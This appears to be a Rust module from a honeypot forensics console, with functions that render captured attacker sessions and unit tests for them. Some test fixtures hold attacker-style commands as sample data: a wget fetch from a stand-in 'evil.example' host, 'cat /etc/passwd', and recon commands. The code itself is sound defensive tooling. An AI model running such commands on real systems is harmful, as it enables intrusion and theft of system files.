/// `pub(crate)` because `routes::search` (console-forensics task 5) reuses the same cursor
/// encoding for event search pagination - see that module's doc comment.
pub(crate) fn parse_cursor(raw: &str) -> Option<(DateTime<Utc>, i64)> {
    let (time_part, id_part) = raw.split_once(',')?;
    let observed_at = DateTime::parse_from_rfc3339(time_part)
        .ok()?
        .with_timezone(&Utc);
    let id = id_part.parse::<i64>().ok()?;
    Some((observed_at, id))
}

/// Renders the keyset cursor for the row `(observed_at, id)` - the last row of a page - as the
/// `?cursor=` value the next "Load more" click sends. Always forces the UTC `Z` suffix
/// (`to_rfc3339_opts(.., true)`) rather than chrono's default `+00:00`: the button's `hx-get` href
/// carries this string verbatim in a query string, and axum's `Query` extractor decodes query
/// values as `application/x-www-form-urlencoded`, where an unescaped `+` means a literal space -
/// `+00:00` would silently corrupt into `<space>00:00` and fail to parse back. No comma or `+`
/// ever appears in the formatted output, so no URL-encoding is needed for the value to round-trip.
pub(crate) fn format_cursor(observed_at: DateTime<Utc>, id: i64) -> String {
    format!(
        "{},{id}",
        observed_at.to_rfc3339_opts(SecondsFormat::Micros, true)
    )
}

/// Every category ever contributed for this IP, with its CURRENT (live-decayed) weight - not
/// filtered to only those still above the eligibility engine's 0.5 live floor. A category that
/// has since decayed away is still real evidence history; hiding it here would make the detail
/// page (the one place meant to show the full picture) less complete than the queue's own
/// category summary.
fn category_rows(breakdown: &serde_json::Value) -> Vec<CategoryRow> {
    let Ok(map) = serde_json::from_value::<BTreeMap<Category, CategoryStatView>>(breakdown.clone())
    else {
        return Vec::new();
    };
    map.into_iter()
        .map(|(category, stat)| CategoryRow {
            category: format!("{category:?}").to_lowercase(),
            weight: format!("{:.1}", stat.weight),
            max_confidence: format!("{:.3}", stat.max_confidence),
        })
        .collect()
}

/// Human label for a sensor's `sensor` field, e.g. `cred-vnc` -> `VNC (5900)`. The canonical sensor
/// names come from the deployment's `PROPOLIS_SENSOR_LOGS` map (see `INSTALL.md`); an unknown sensor
/// (a renamed or future one) falls back to its raw name rather than being dropped, so the panel
/// never hides activity it cannot label. `catchall` covers many ports, so it is labelled as a scan
/// rather than a single port.
fn service_label(sensor: &str) -> String {
    let label = match sensor {
        "ssh" => "SSH (22)",
        "telnet" => "Telnet (23)",
        "http" => "HTTP (80)",
        "ftp" => "FTP (21)",
        "smtp" => "SMTP (25)",
        "redis" => "Redis (6379)",
        "adb" => "ADB (5555)",
        "cred-vnc" => "VNC (5900)",
        "cred-mysql" => "MySQL (3306)",
        "cred-mssql" => "MSSQL (1433)",
        "cred-pg" => "PostgreSQL (5432)",
        "cred-mongo" => "MongoDB (27017)",
        "catchall" => "Catch-all (port scan)",
        other => return other.to_string(),
    };
    label.to_string()
}

/// The operator-initiated external lookup links shown on the detail page. Each opens in the
/// operator's own browser (`target=_blank`), so the honeypot never makes the request itself and
/// never leaks which addresses it has captured. `ip` is an already-validated `IpAddr` (the route's
/// path param), so its string form is safe to interpolate into the URL with no escaping concern.
fn external_lookup_links(ip: IpAddr) -> Vec<ExternalLink> {
    let ip = ip.to_string();
    [
        ("Shodan", format!("https://www.shodan.io/host/{ip}")),
        ("GreyNoise", format!("https://viz.greynoise.io/ip/{ip}")),
        ("AbuseIPDB", format!("https://www.abuseipdb.com/check/{ip}")),
        (
            "VirusTotal",
            format!("https://www.virustotal.com/gui/ip-address/{ip}"),
        ),
    ]
    .into_iter()
    .map(|(name, url)| ExternalLink {
        name: name.to_string(),
        url,
    })
    .collect()
}

/// `core_scoring::SignalType`'s `Debug` output is `PascalCase` (e.g. `HoneypotCommandExec`); the
/// DB's `signal_type_enum` and this module's own `extract_detail`/`format_activity` match arms
/// both key on the wire's `snake_case` spelling (`honeypot_command_exec`), so every caller that
/// needs the string form converts through here rather than re-deriving the fold independently.
/// `pub(crate)` because `routes::search` (console-forensics task 5) reuses it for the same
/// conversion on event search result rows.
pub(crate) fn signal_type_snake(signal_type: SignalType) -> String {
    let pascal = format!("{signal_type:?}");
    pascal.chars().fold(String::new(), |mut s, c| {
        if c.is_uppercase() && !s.is_empty() {
            s.push('_');
        }
        s.push(c.to_ascii_lowercase());
        s
    })
}

/// Signal-type-dependent extraction of the single most useful `metadata` field for the evidence
/// timeline's "Detail" column - `internal/design/11-console-forensics.md`'s "Detail column
/// extraction by signal type" table. `pub(crate)` because `routes::search` (console-forensics
/// task 5) reuses it verbatim for the same column in event search results.
pub(crate) fn extract_detail(signal_type: &str, metadata: &serde_json::Value) -> String {
    match signal_type {
        // Prefer the de-obfuscated command when the sensor recovered one (an XOR-encoded probe), so
        // the timeline reads `enable` rather than `lghkel`; the raw form stays in the raw expander.
        "honeypot_command_exec" => metadata
            .get("command_decoded")
            .or_else(|| metadata.get("command"))
            .and_then(|v| v.as_str())
            .unwrap_or("-")
            .to_string(),
        "honeypot_login_attempt" => metadata
            .get("username")
            .and_then(|v| v.as_str())
            .map(|u| format!("user: {u}"))
            .unwrap_or_else(|| "-".into()),
        "honeypot_malware_upload" => {
            let name = metadata
                .get("sample_orig_name")
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            let sha = metadata
                .get("sample_sha256")
                .and_then(|v| v.as_str())
                .map(|s| &s[..s.len().min(12)])
                .unwrap_or("?");
            let size = metadata
                .get("sample_size")
                .and_then(|v| v.as_u64())
                .map(format_bytes)
                .unwrap_or_default();
            format!("{name} ({sha}..., {size})")
        }
        "honeypot_file_download" => metadata
            .get("url")
            .or_else(|| metadata.get("command"))
            .and_then(|v| v.as_str())
            .unwrap_or("-")
            .to_string(),
        "honeypot_connection" => metadata
            .get("protocol_label")
            .and_then(|v| v.as_str())
            .unwrap_or("-")
            .to_string(),
        "catchall_probe" => metadata
            .get("port")
            .and_then(|v| v.as_u64())
            .map(|p| format!("port {p}"))
            .unwrap_or_else(|| "-".into()),
        _ => metadata
            .as_object()
            .and_then(|m| {
                m.iter()
                    .find(|(k, _)| k.as_str() != "protocol_label")
                    .map(|(k, v)| format!("{k}: {v}"))
            })
            .unwrap_or_else(|| "-".into()),
    }
}

/// Human-readable byte count for the malware-upload detail column (`4.2 KB`, `1.1 MB`).
fn format_bytes(b: u64) -> String {
    if b < 1024 {
        format!("{b} B")
    } else if b < 1024 * 1024 {
        format!("{:.1} KB", b as f64 / 1024.0)
    } else {
        format!("{:.1} MB", b as f64 / (1024.0 * 1024.0))
    }
}

/// Human-readable elapsed time for a session card's duration (`12s`, `3m05s`, `1h02m`).
fn format_duration(d: chrono::Duration) -> String {
    let total_secs = d.num_seconds().max(0);
    if total_secs < 60 {
        format!("{total_secs}s")
    } else if total_secs < 3600 {
        format!("{}m{:02}s", total_secs / 60, total_secs % 60)
    } else {
        format!("{}h{:02}m", total_secs / 3600, (total_secs % 3600) / 60)
    }
}

/// Splits the flat, newest-first `all_events` into per-`session_id` [`SessionGroup`]s (each
/// sorted oldest-first, so a card reads top-to-bottom as the connection unfolded) plus an
/// "Ungrouped events" tail for rows with no `session_id` (pre-existing data from before this
/// column existed - `internal/design/11-console-forensics.md`'s "degrade gracefully"). Groups are
/// then ordered most-recent-session-first, and the `recent_expanded` newest get `expanded: true`
/// so the operator lands on an already-open view of current activity rather than a wall of
/// collapsed cards.
fn group_into_sessions(
    rows: Vec<EventRow>,
    recent_expanded: usize,
) -> (Vec<SessionGroup>, Vec<EventRow>) {
    let mut sessions: BTreeMap<String, Vec<EventRow>> = BTreeMap::new();
    let mut ungrouped = Vec::new();

    for row in rows {
        match row.session_id.clone() {
            Some(sid) => sessions.entry(sid).or_default().push(row),
            None => ungrouped.push(row),
        }
    }

    let mut groups: Vec<SessionGroup> = sessions
        .into_iter()
        .map(|(session_id, mut events)| {
            events.sort_by_key(|e| e.raw_observed_at);

            // `events` is never empty here - every group came from `.entry(sid).or_default()`
            // being pushed into at least once, so these two endpoints always exist.
            let start = events[0].raw_observed_at;
            let end = events[events.len() - 1].raw_observed_at;

            let username = events
                .iter()
                .find(|e| e.signal_type_raw == "honeypot_login_attempt")
                .and_then(|e| e.metadata.get("username"))
                .and_then(|v| v.as_str())
                .unwrap_or_default()
                .to_string();
            let command_count = events
                .iter()
                .filter(|e| e.signal_type_raw == "honeypot_command_exec")
                .count();

            SessionGroup {
                session_id,
                start_time: events[0].observed_at.clone(),
                start_relative: events[0].relative_time.clone(),
                duration: format_duration(end - start),
                sensor: format_sensor_label(&events[0].sensor_raw),
                protocol: events[0].protocol.clone(),
                username,
                command_count,
                event_count: events.len(),
                end_time: format_timestamp(end),
                events,
                expanded: false,
            }
        })
        .collect();

    // Most-recent-first by session END (latest `observed_at` in the group) -
    // `internal/design/11-console-forensics.md`'s "Order sessions by most recent first (latest
    // `observed_at` in each group)", not by when each session started.
    groups.sort_by(|a, b| b.end_time.cmp(&a.end_time));
    for (i, g) in groups.iter_mut().enumerate() {
        g.expanded = i < recent_expanded;
    }
    (groups, ungrouped)
}

/// `IpAddr::to_string()`/`Display` can only ever produce digits, `.`, and `:` - never an HTML
/// metacharacter - so interpolating it directly into a literal string here is safe by
/// construction, the same reasoning `routes::error`'s static `GENERIC_BODY` relies on for having
/// no interpolation at all.
fn not_found_body(ip: IpAddr) -> Html<String> {
    Html(format!(
        "<!doctype html><meta charset=\"utf-8\"><title>IP not found</title>\
         <p style=\"font-family:sans-serif;padding:2rem\">No score projection found for {ip}. \
         It may not have been scored yet, or the IP was mistyped.</p>"
    ))
}

#[cfg(test)]
mod tests {
    use chrono::Duration;
    use serde_json::json;

    use super::*;

    /// Builds a minimal `EventRow` fixture. Every caller overrides only the fields its test
    /// actually exercises, so a change to an unrelated field never touches every test in the
    /// module - the same shape as `sensor-catchall`'s own `build_event` test fixtures.
    fn event_row(
        session_id: Option<&str>,
        signal_type: &str,
        seconds_ago: i64,
        metadata: serde_json::Value,
    ) -> EventRow {
        let observed_at = Utc::now() - Duration::seconds(seconds_ago);
        EventRow {
            id: 1,
            observed_at: format_timestamp(observed_at),
            relative_time: format_relative_time(observed_at),
            activity: format_activity("ssh", signal_type),
            detail: extract_detail(signal_type, &metadata),
            xor_badge: None,
            protocol: "Tcp".into(),
            authenticated: true,
            wan_ip: "203.0.113.9".into(),
            metadata_json: metadata.to_string(),
            session_id: session_id.map(str::to_string),
            raw_observed_at: observed_at,
            sensor_raw: "ssh".into(),
            signal_type_raw: signal_type.into(),
            metadata,
        }
    }

    #[test]
    fn extract_detail_command_exec_reads_command_field() {
        let metadata = json!({ "command": "cat /etc/passwd" });
        assert_eq!(
            extract_detail("honeypot_command_exec", &metadata),
            "cat /etc/passwd"
        );
    }

    #[test]
    fn service_label_maps_known_sensors_and_falls_back_to_raw() {
        assert_eq!(service_label("cred-vnc"), "VNC (5900)");
        assert_eq!(service_label("ssh"), "SSH (22)");
        assert_eq!(service_label("catchall"), "Catch-all (port scan)");
        // An unknown/renamed sensor is never dropped - it shows its raw name.
        assert_eq!(service_label("some-future-sensor"), "some-future-sensor");
    }

    #[test]
    fn external_lookup_links_build_per_vendor_urls_for_the_ip() {
        let ip: IpAddr = "203.0.113.7".parse().unwrap();
        let links = external_lookup_links(ip);
        let by: std::collections::HashMap<_, _> = links
            .iter()
            .map(|l| (l.name.as_str(), l.url.as_str()))
            .collect();
        assert_eq!(by["Shodan"], "https://www.shodan.io/host/203.0.113.7");
        assert_eq!(by["GreyNoise"], "https://viz.greynoise.io/ip/203.0.113.7");
        assert_eq!(
            by["AbuseIPDB"],
            "https://www.abuseipdb.com/check/203.0.113.7"
        );
        assert_eq!(
            by["VirusTotal"],
            "https://www.virustotal.com/gui/ip-address/203.0.113.7"
        );
    }

    #[test]
    fn extract_detail_command_exec_prefers_decoded_over_raw() {
        // When the sensor recovered an XOR-obfuscated probe, the timeline shows the decoded form;
        // the raw (still-obfuscated) bytes remain in `command` for the raw expander and hash chain.
        let metadata = json!({ "command": "lghkel", "command_decoded": "enable" });
        assert_eq!(extract_detail("honeypot_command_exec", &metadata), "enable");
    }

    #[test]
    fn extract_detail_login_attempt_prefixes_username() {
        let metadata = json!({ "username": "root" });
        assert_eq!(
            extract_detail("honeypot_login_attempt", &metadata),
            "user: root"
        );
    }

    #[test]
    fn extract_detail_malware_upload_truncates_sha_and_formats_size() {
        let metadata = json!({
            "sample_orig_name": "payload.sh",
            "sample_sha256": "a1b2c3d4e5f6a7b8c9d0",
            "sample_size": 4300u64,
        });
        assert_eq!(
            extract_detail("honeypot_malware_upload", &metadata),
            "payload.sh (a1b2c3d4e5f6..., 4.2 KB)"
        );
    }

    #[test]
    fn extract_detail_malware_upload_missing_fields_falls_back() {
        let metadata = json!({});
        assert_eq!(
            extract_detail("honeypot_malware_upload", &metadata),
            "unknown (?..., )"
        );
    }

    #[test]
    fn extract_detail_file_download_prefers_url_over_command() {
        let metadata = json!({ "url": "http://evil.example/bot", "command": "wget" });
        assert_eq!(
            extract_detail("honeypot_file_download", &metadata),
            "http://evil.example/bot"
        );
    }

    #[test]
    fn extract_detail_file_download_falls_back_to_command() {
        let metadata = json!({ "command": "wget http://evil.example/bot" });
        assert_eq!(
            extract_detail("honeypot_file_download", &metadata),
            "wget http://evil.example/bot"
        );
    }

    #[test]
    fn extract_detail_connection_reads_protocol_label() {
        let metadata = json!({ "protocol_label": "ssh" });
        assert_eq!(extract_detail("honeypot_connection", &metadata), "ssh");
    }

    #[test]
    fn extract_detail_catchall_probe_reads_port() {
        let metadata = json!({ "port": 8080 });
        assert_eq!(extract_detail("catchall_probe", &metadata), "port 8080");
    }

    #[test]
    fn extract_detail_catchall_probe_missing_port_falls_back_to_dash() {
        let metadata = json!({ "payload_hex": "deadbeef", "observed_len": 4 });
        assert_eq!(extract_detail("catchall_probe", &metadata), "-");
    }

    #[test]
    fn extract_detail_unknown_signal_skips_protocol_label() {
        let metadata = json!({ "protocol_label": "redis", "note": "unusual" });
        assert_eq!(
            extract_detail("some_future_signal", &metadata),
            "note: \"unusual\""
        );
    }

    #[test]
    fn extract_detail_unknown_signal_with_only_protocol_label_falls_back_to_dash() {
        let metadata = json!({ "protocol_label": "redis" });
        assert_eq!(extract_detail("some_future_signal", &metadata), "-");
    }

    #[test]
    fn signal_type_snake_converts_pascal_case() {
        assert_eq!(
            signal_type_snake(SignalType::HoneypotCommandExec),
            "honeypot_command_exec"
        );
        assert_eq!(
            signal_type_snake(SignalType::CatchallProbe),
            "catchall_probe"
        );
    }

    #[test]
    fn format_bytes_picks_the_right_unit() {
        assert_eq!(format_bytes(512), "512 B");
        assert_eq!(format_bytes(4300), "4.2 KB");
        assert_eq!(format_bytes(5_242_880), "5.0 MB");
    }

    #[test]
    fn format_duration_picks_the_right_unit() {
        assert_eq!(format_duration(Duration::seconds(42)), "42s");
        assert_eq!(format_duration(Duration::seconds(185)), "3m05s");
        assert_eq!(format_duration(Duration::seconds(3725)), "1h02m");
    }

    #[test]
    fn group_into_sessions_separates_grouped_from_ungrouped() {
        let rows = vec![
            event_row(Some("sess-a"), "honeypot_connection", 100, json!({})),
            event_row(
                None,
                "honeypot_login_attempt",
                90,
                json!({ "username": "admin" }),
            ),
        ];
        let (groups, ungrouped) = group_into_sessions(rows, 3);
        assert_eq!(groups.len(), 1);
        assert_eq!(ungrouped.len(), 1);
        assert_eq!(groups[0].session_id, "sess-a");
    }

    #[test]
    fn group_into_sessions_derives_username_and_command_count() {
        let rows = vec![
            event_row(Some("sess-a"), "honeypot_connection", 100, json!({})),
            event_row(
                Some("sess-a"),
                "honeypot_login_attempt",
                90,
                json!({ "username": "root" }),
            ),
            event_row(
                Some("sess-a"),
                "honeypot_command_exec",
                80,
                json!({ "command": "whoami" }),
            ),
            event_row(
                Some("sess-a"),
                "honeypot_command_exec",
                70,
                json!({ "command": "id" }),
            ),
        ];
        let (groups, _) = group_into_sessions(rows, 3);
        assert_eq!(groups.len(), 1);
        assert_eq!(groups[0].username, "root");
        assert_eq!(groups[0].command_count, 2);
        assert_eq!(groups[0].event_count, 4);
    }

    #[test]
    fn group_into_sessions_orders_events_within_a_session_oldest_first() {
        let rows = vec![
            event_row(
                Some("sess-a"),
                "honeypot_command_exec",
                10,
                json!({ "command": "b" }),
            ),
            event_row(Some("sess-a"), "honeypot_connection", 100, json!({})),
            event_row(
                Some("sess-a"),
                "honeypot_command_exec",
                50,
                json!({ "command": "a" }),
            ),
        ];
        let (groups, _) = group_into_sessions(rows, 3);
        let activities: Vec<&str> = groups[0].events.iter().map(|e| e.detail.as_str()).collect();
        assert_eq!(activities, vec!["-", "a", "b"]);
    }

    #[test]
    fn group_into_sessions_orders_sessions_most_recent_first_and_expands_only_the_newest() {
        let rows = vec![
            event_row(Some("sess-old"), "honeypot_connection", 1000, json!({})),
            event_row(Some("sess-mid"), "honeypot_connection", 500, json!({})),
            event_row(Some("sess-new"), "honeypot_connection", 10, json!({})),
        ];
        let (groups, _) = group_into_sessions(rows, 2);
        let ids: Vec<&str> = groups.iter().map(|g| g.session_id.as_str()).collect();
        assert_eq!(ids, vec!["sess-new", "sess-mid", "sess-old"]);
        assert!(groups[0].expanded);
        assert!(groups[1].expanded);
        assert!(!groups[2].expanded);
    }

    #[test]
    fn group_into_sessions_orders_by_end_time_not_start_time() {
        // "sess-long" starts long before "sess-short" but is still running: its last event is
        // more recent than "sess-short"'s. Sorting by `start_time` (the bug) would put
        // "sess-short" first, since it started more recently even though it ended earlier -
        // sorting by `end_time` (the design spec's "latest observed_at in each group") puts
        // "sess-long" first instead.
        let rows = vec![
            event_row(Some("sess-long"), "honeypot_connection", 500, json!({})),
            event_row(
                Some("sess-long"),
                "honeypot_command_exec",
                50,
                json!({ "command": "id" }),
            ),
            event_row(Some("sess-short"), "honeypot_connection", 100, json!({})),
            event_row(
                Some("sess-short"),
                "honeypot_command_exec",
                90,
                json!({ "command": "id" }),
            ),
        ];
        let (groups, _) = group_into_sessions(rows, 3);
        let ids: Vec<&str> = groups.iter().map(|g| g.session_id.as_str()).collect();
        assert_eq!(ids, vec!["sess-long", "sess-short"]);
    }

    #[test]
    fn group_into_sessions_with_no_sessions_returns_empty_groups() {
        let rows = vec![event_row(None, "catchall_probe", 5, json!({ "port": 22 }))];
        let (groups, ungrouped) = group_into_sessions(rows, 3);
        assert!(groups.is_empty());
        assert_eq!(ungrouped.len(), 1);
    }

    #[test]
    fn format_cursor_round_trips_through_parse_cursor() {
        let observed_at = Utc::now() - Duration::seconds(12345);
        let cursor = format_cursor(observed_at, 987);
        let (parsed_time, parsed_id) = parse_cursor(&cursor).expect("cursor should parse");
        // `to_rfc3339_opts` with `Micros` truncates below microsecond precision; `Utc::now()`
        // itself is already sub-microsecond in practice on every platform this runs on, so a
        // microsecond-level round-trip comparison is exact, not approximate.
        assert_eq!(
            parsed_time.timestamp_micros(),
            observed_at.timestamp_micros()
        );
        assert_eq!(parsed_id, 987);
    }

    #[test]
    fn format_cursor_never_emits_a_plus_sign() {
        // A `+00:00` UTC offset (chrono's default `to_rfc3339` form) would decode as a literal
        // space through axum's `application/x-www-form-urlencoded` `Query` extractor - see
        // `format_cursor`'s doc comment. The forced `Z` suffix must never regress to `+00:00`.
        let cursor = format_cursor(Utc::now(), 1);
        assert!(
            !cursor.contains('+'),
            "cursor must not contain '+': {cursor}"
        );
        assert!(
            cursor.ends_with("Z,1"),
            "cursor must end in Z,<id>: {cursor}"
        );
    }

    #[test]
    fn parse_cursor_rejects_malformed_input() {
        assert!(parse_cursor("not-a-timestamp,12").is_none());
        assert!(parse_cursor("2026-01-01T00:00:00Z").is_none()); // missing ",<id>"
        assert!(parse_cursor("2026-01-01T00:00:00Z,not-an-id").is_none());
        assert!(parse_cursor("").is_none());
    }

    #[test]
    fn normalize_detail_range_accepts_known_values_and_defaults_to_7d() {
        assert_eq!(normalize_detail_range(Some("24h")), "24h");
        assert_eq!(normalize_detail_range(Some("7d")), "7d");
        assert_eq!(normalize_detail_range(Some("30d")), "30d");
        assert_eq!(normalize_detail_range(Some("bogus")), "7d");
        assert_eq!(normalize_detail_range(None), "7d");
    }
}
